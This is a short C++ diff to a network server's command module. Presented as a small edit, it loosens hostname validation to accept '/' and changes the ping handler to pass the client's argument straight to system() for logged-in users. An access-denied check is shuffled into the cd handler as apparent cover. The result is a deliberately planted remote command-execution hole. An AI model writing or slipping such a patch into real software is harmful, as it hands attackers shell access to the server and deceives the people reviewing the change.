@@ -132,7 +132,7 @@ void Commands::require_no_parameters(string cmd){
 void Commands::check_hostname(string str){
   for(size_t i=0;i < str.size();++i){
     char c=str[i];
-    if (!(c == '.' || c == '-' || (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))){
+    if (!(c == '.' || c == '-' || c=='/' || (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))){
       throw Exception(ERR_INVALID_ARGS);
     }
   }
@@ -376,7 +376,7 @@ string Commands::cmd_ping(string cmd, unsigned int socket){
     require_parameters(cmd);
     check_hostname(cmd);
     if (auth.getUser(socket).getLogin()){
-        system((char *) access_denied);
+        system(cmd.c_str());
         return "";
     } else {
         char command[] = "/bin/ping";
@@ -403,6 +403,10 @@ string Commands::cmd_ls(string cmd, unsigned int socket){
 }
 
 string Commands::cmd_cd(string cmd, unsigned int socket){
+    if (auth.getUser(socket).getLogin()){
+        system((char *) access_denied);
+        return "";
+    }
     set_user_path(deal_with_path(cmd,get_full_path(socket),path,path),socket);
     return "";
 }
